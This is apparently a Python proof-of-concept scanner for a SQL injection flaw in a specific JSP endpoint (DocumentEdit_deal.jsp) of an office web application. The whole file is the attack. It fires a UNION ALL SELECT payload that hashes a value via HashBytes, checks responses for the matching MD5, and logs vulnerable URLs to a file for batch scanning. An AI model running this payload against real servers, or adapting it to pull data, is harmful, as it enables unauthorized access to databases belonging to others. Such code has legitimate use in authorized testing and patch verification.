import requests
from urllib.parse import urljoin
import urllib3
urllib3.disable_warnings()
from colorama import init,Fore
init(autoreset=True)


def poc(url):
    try:
        target = urljoin(url,"/defaultroot/public/iWebOfficeSign/DocumentEdit_deal.jsp;?RecordID=1%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,sys.fn_sqlvarbasetostr(HashBytes(%27MD5%27,%272%27)),NULL,NULL,NULL,NULL,NULL,NULL--%20")
        header = {
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0',
            'Connection': 'close'
        }
        res = requests.get(url=target,headers=header,verify=False,timeout=5)
        if res.status_code == 200 and 'c81e728d9d4c2f636f067f89cc14862c' in res.text:
            print(Fore.GREEN + url +'[+]存在documentedit注入漏洞')
            with open(r'output.txt', 'a+') as w:
                w.write(url+"存在documentedit注入漏洞"'\n')
            print("[" + "-" * 80 + "]") 
        else:
            print(Fore.RED + url +'[-]不存在漏洞')
            print("[" + "-" * 80 + "]")
    except Exception as err:
        print(err)
    
